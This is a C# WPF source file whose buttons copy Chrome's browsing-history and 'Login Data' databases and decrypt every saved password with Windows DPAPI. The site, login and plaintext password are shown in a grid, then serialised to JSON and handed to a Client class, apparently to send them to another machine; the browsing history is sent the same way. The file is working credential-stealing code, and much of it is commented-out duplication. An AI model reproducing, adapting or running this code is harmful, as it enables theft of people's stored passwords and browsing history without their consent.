using System;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Data.SQLite;
using System.IO;
using System.Data;
using Newtonsoft.Json;
using System.Net;

namespace DPAPI___Wpf
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void BtnGetData_Click(object sender, RoutedEventArgs e)
        {
            string google = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History";
            string fileName = DateTime.Now.Ticks.ToString();
            File.Copy(google, System.AppDomain.CurrentDomain.BaseDirectory + "\\" + fileName);
            using (SQLiteConnection con = new SQLiteConnection("DataSource = " + System.AppDomain.CurrentDomain.BaseDirectory + "\\" + fileName + ";Versio=3;New=False;Compress=True;"))
            {
                con.Open();
                //SQLiteDataAdapter da = new SQLiteDataAdapter("select url,title,visit_count,last_visit_time from urls order by last_visit_time desc", con);
                SQLiteDataAdapter da = new SQLiteDataAdapter("select * from urls order by last_visit_time desc LIMIT 100", con);
                DataSet ds = new DataSet();
                da.Fill(ds);
                DataTable dt = ds.Tables[0];
                DataTable tmpdt = new DataTable();
                tmpdt.Columns.Add("id", typeof(string));
                tmpdt.Columns.Add("url", typeof(string));
                tmpdt.Columns.Add("title", typeof(string));
                tmpdt.Columns.Add("visit_count", typeof(string));
                tmpdt.Columns.Add("last_visit_time", typeof(DateTime));
                DataRow myRow = tmpdt.NewRow();
                try
                {
                    //dt.Columns["last_visit_time"].DataType = typeof(DateTime);

                    foreach (DataRow row in dt.Rows)
                    {
                        DataRow tmpRow = tmpdt.NewRow();
                        tmpRow[0] = row[0].ToString();
                        tmpRow[1] = row[1].ToString();
                        tmpRow[2] = row[2].ToString();
                        tmpRow[3] = row[3].ToString();
                        long time = Convert.ToInt64(row["last_visit_time"].ToString());
                        DateTime gmt = DateTime.FromFileTimeUtc(10 * time);

                        DateTime localTime = TimeZoneInfo.ConvertTimeFromUtc(gmt, TimeZoneInfo.Local);

                        tmpRow[4] = localTime;
                        //tmpdt.rows["last_visit_time"] = localTime;

                        tmpdt.Rows.Add(tmpRow);
                    }

                    Task.Run(() =>
                    {
                        Client myClient = new Client();
                        string tmp = JsonConvert.SerializeObject(tmpdt);
                        myClient.DoClientStuff(tmp);
                    });
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                finally
                {
                    dataGridView1.ItemsSource = tmpdt.AsDataView();
                    //dataGridView1.ItemsSource = ds.Tables[0].AsDataView();
                    con.Close();
                }
            }
            try // File already open error is skipped
            {
                if (File.Exists(System.AppDomain.CurrentDomain.BaseDirectory + "\\" + fileName))
                    File.Delete(System.AppDomain.CurrentDomain.BaseDirectory + "\\" + fileName);
            }
            catch (Exception)
            {
            }
        }

        public async Task<DataTable> GetPasswordsAsync()
        {

            return await Task.Run(() =>
            {
                DataTable dt = new DataTable();
                //try
                //{
                //string filename = "my_chrome_passwords.html";
                //StreamWriter Writer = new StreamWriter(filename, false, Encoding.UTF8);
                string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                    + "/Google/Chrome/User Data/Default/Login Data"; // a path to a database file
                Console.WriteLine("DB file = " + db_way);
                string db_field = "logins";   // DB table field name
                byte[] entropy = null; // DPAPI class does not use entropy but requires this parameter
                string description;    // I could not understand the purpose of a this mandatory parameter
                                       // Output always is Null
                                       // Connect to DB
                string google = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
                string fileName = DateTime.Now.Ticks.ToString();
                File.Copy(google, System.AppDomain.CurrentDomain.BaseDirectory + "\\" + fileName);
                //string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
                string ConnectionString = "DataSource = " + System.AppDomain.CurrentDomain.BaseDirectory + "\\" + fileName + ";Versio=3;New=False;Compress=True;";
                DataTable DB = new DataTable();
                string sql = string.Format("SELECT * FROM {0} {1} {2}", db_field, "", "");
                //DataTable dt = new DataTable();
                dt.Columns.Add("Site URL");
                dt.Columns.Add("Login Info");
                dt.Columns.Add("Password");

                using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
                {
                    SQLiteCommand command = new SQLiteCommand(sql, connect);
                    SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                    adapter.Fill(DB);
                    int rows = DB.Rows.Count;
                    for (int i = 0; i < rows; i++)
                    {
                        if (DB.Rows[i][1].ToString() != string.Empty)
                        {
                            //Writer.Write(i + 1 + ") "); // Here we print order number of our trinity "site-login-password"
                            //Writer.WriteLine(DB.Rows[i][1] + "<br>"); // site URL
                            //Writer.WriteLine(DB.Rows[i][3] + "<br>"); // login
                            //                                          // Here the password description
                            byte[] byteArray = (byte[])DB.Rows[i][5];
                            byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                            string password = new UTF8Encoding(true).GetString(decrypted);
                            DataRow dr = dt.NewRow();
                            dr["Site URL"] = DB.Rows[i][1];
                            dr["Login Info"] = DB.Rows[i][3];
                            dr["Password"] = password;
                            dt.Rows.Add(dr);

                            //Writer.WriteLine(password + "<br><br>");
                        }

                    }

                }
                //System.Threading.Thread.Sleep(3000);
                //foreach (DataRow item in dt.Rows)
                //{
                //    if (!item[0].ToString().ToLower().Contains("https"))
                //    {
                //        item
                //    }
                //}

                return ReverseRowsInDataTable(dt);
                //Writer.Close();
                //dataGridView1.ItemsSource = ReverseRowsInDataTable(dt).AsDataView();
                //return dt;

                //}
                //catch (Exception ex)
                //{
                //    Console.WriteLine(ex.Message);
                //    ex = ex.InnerException;
                //}
                //finally
                //{
                //    return dt;
                //}
            });
            //}
        }

            private async void btnGetPasswords_Click(object sender, RoutedEventArgs e)
            {
                try
                {
                    DataTable dt = await GetPasswordsAsync();
                    dataGridView1.ItemsSource = dt.AsDataView();
                    Client myClient = new Client();
                    string result = JsonConvert.SerializeObject(dt);
                    //IPAddress serverIP = myClient.GetIPAddress();
                    //MessageBox.Show(myClient.GetLocalIPAddress());
                    myClient.DoClientStuff(result);
                    //myClient.DoClientStuff()
                    //for (int i = 0; i < dataGridView1.Items.Count; i++)
                    //{
                    //    DataGridRow row = (DataGridRow)dataGridView1.ItemContainerGenerator.ContainerFromIndex(i);

                    //    row.Background = Brushes.LightCoral;
                    //}
                    foreach (DataRowView drv in (DataView)dataGridView1.ItemsSource)
                    {
                        if (drv[1].ToString().Contains("m"))
                        {
                            //drv.Row.RowState.

                        }
                    }
                    //MessageBox.Show($"Retrieved {dt.Rows.Count} Rows !");
                }
                catch (Exception ex)
                {

                    MessageBox.Show(ex.Message);

                }
                //string google = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
                //StreamWriter sw = new StreamWriter(google, false, Encoding.UTF8);
                //string db_way = "Login Data";
                //string db_field = "logins";
                //byte[] entropy = null;


                //DataTable dt = new DataTable();
                //string sSql = string.Format("Select * From {0} {1} {2}", db_field, "", "");
                //using (SQLiteConnection myConnection = new SQLiteConnection("DataSource = " + System.AppDomain.CurrentDomain.BaseDirectory + "\\" + sw + ";Versio=3;New=False;Compress=True;"))
                //{
                //    SQLiteCommand myCmd = new SQLiteCommand(sSql, myConnection);
                //    SQLiteDataAdapter adapter = new SQLiteDataAdapter(myCmd);
                //    adapter.Fill(dt);
                //    int rows = dt.Rows.Count;
                //    for (int i = 0; i < rows; i++)
                //    {
                //        sw.Write(i + 1 + ") ");
                //        sw.WriteLine(dt.Rows[i][1] + "<br>");
                //        sw.WriteLine(dt.Rows[i][3] + "<br>");
                //        byte[] byteArray = (byte[])dt.Rows[i][5];
                //        byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out string description);
                //        string password = new UTF8Encoding(true).GetString(decrypted);
                //        sw.WriteLine(password + "<br><br>");
                //    }
                //};
                //try
                //{
                //    //string filename = "my_chrome_passwords.html";
                //    //StreamWriter Writer = new StreamWriter(filename, false, Encoding.UTF8);
                //    string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                //        + "/Google/Chrome/User Data/Default/Login Data"; // a path to a database file
                //    Console.WriteLine("DB file = " + db_way);
                //    string db_field = "logins";   // DB table field name
                //    byte[] entropy = null; // DPAPI class does not use entropy but requires this parameter
                //    string description;    // I could not understand the purpose of a this mandatory parameter
                //                           // Output always is Null
                //                           // Connect to DB
                //    string google = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
                //    string fileName = DateTime.Now.Ticks.ToString();
                //    File.Copy(google, System.AppDomain.CurrentDomain.BaseDirectory + "\\" + fileName);
                //    //string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
                //    string ConnectionString = "DataSource = " + System.AppDomain.CurrentDomain.BaseDirectory + "\\" + fileName + ";Versio=3;New=False;Compress=True;";
                //    DataTable DB = new DataTable();
                //    string sql = string.Format("SELECT * FROM {0} {1} {2}", db_field, "", "");
                //    DataTable dt = new DataTable();
                //    dt.Columns.Add("Site URL");
                //    dt.Columns.Add("Login Info");
                //    dt.Columns.Add("Password");

                //    using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
                //    {
                //        SQLiteCommand command = new SQLiteCommand(sql, connect);
                //        SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                //        adapter.Fill(DB);
                //        int rows = DB.Rows.Count;
                //        for (int i = 0; i < rows; i++)
                //        {
                //            if (DB.Rows[i][1].ToString() != string.Empty)
                //            {
                //                //Writer.Write(i + 1 + ") "); // Here we print order number of our trinity "site-login-password"
                //                //Writer.WriteLine(DB.Rows[i][1] + "<br>"); // site URL
                //                //Writer.WriteLine(DB.Rows[i][3] + "<br>"); // login
                //                //                                          // Here the password description
                //                byte[] byteArray = (byte[])DB.Rows[i][5];
                //                byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                //                string password = new UTF8Encoding(true).GetString(decrypted);
                //                DataRow dr = dt.NewRow();
                //                dr["Site URL"] = DB.Rows[i][1];
                //                dr["Login Info"] = DB.Rows[i][3];
                //                dr["Password"] = password;
                //                dt.Rows.Add(dr);

                //                //Writer.WriteLine(password + "<br><br>");
                //            }
                //        }
                //    }
                //    //Writer.Close();
                //    dataGridView1.ItemsSource = ReverseRowsInDataTable(dt).AsDataView();


                //}
                //catch (Exception ex)
                //{
                //    Console.WriteLine(ex.Message);
                //    ex = ex.InnerException;
                //} 


            }

            public DataTable ReverseRowsInDataTable(DataTable inputTable)
            {
                DataTable outputTable = inputTable.Clone();

                for (int i = inputTable.Rows.Count - 1; i >= 0; i--)
                {
                    outputTable.ImportRow(inputTable.Rows[i]);
                }

                return outputTable;
            }

            private void dataGridView1_LoadingRow(object sender, DataGridRowEventArgs e)
            {
                //e.Row.item
                //if (((DataRowView)(e.Row.DataContext)).Row.ItemArray[1].ToString().Contains("https") == false)
                //{
                //    e.Row.Background = Brushes.AliceBlue;
                //}
                //if (e.Row != null)
                //{
                //    DataGridRow row = e.Row;
                //    DataRowView rView = row.Item as DataRowView;
                //    if (rView["Site URL"].ToString().Contains("https") && rView != null && row != null)
                //    {
                //        row.Background = Brushes.AliceBlue;
                //    }
                //}
                //if (e.Row.GetIndex() < dataGridView1.Items.Count -3)
                //{
                //    DataGridRow row = e.Row;
                //    DataRowView rView = row.Item as DataRowView;
                //    if (rView["url"] == null)
                //    {
                //        if (rView["Site URL"].ToString().Contains("https") == false)
                //        {
                //            row.Background = Brushes.AliceBlue;
                //            row.ToolTip = rView["Site URL"].ToString();
                //        }
                //    }
                //    else
                //    {

                //    }
                //}
            }

            private void btnOpenWindow_Click(object sender, RoutedEventArgs e)
            {
                Window1 w = new Window1();
                w.Show();
            }
        }
    }
